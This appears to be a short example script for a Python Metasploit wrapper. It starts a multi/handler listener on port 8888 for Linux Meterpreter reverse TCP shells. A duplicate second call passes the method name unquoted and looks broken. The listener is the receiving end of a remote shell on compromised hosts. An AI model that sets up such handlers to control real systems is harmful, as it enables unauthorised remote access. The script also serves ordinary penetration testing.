from zdppy_metasploit import *

msf = new_metasploit()

opts = {'LHOST': '0.0.0.0', 'LPORT': 8888, 'PAYLOAD': 'linux/x86/meterpreter/reverse_tcp'}
msf.log.info(msf.call("module.execute", ['exploit', 'multi/handler', opts]))
msf.log.info(msf.call(module.execute, ['exploit', 'multi/handler', opts]))
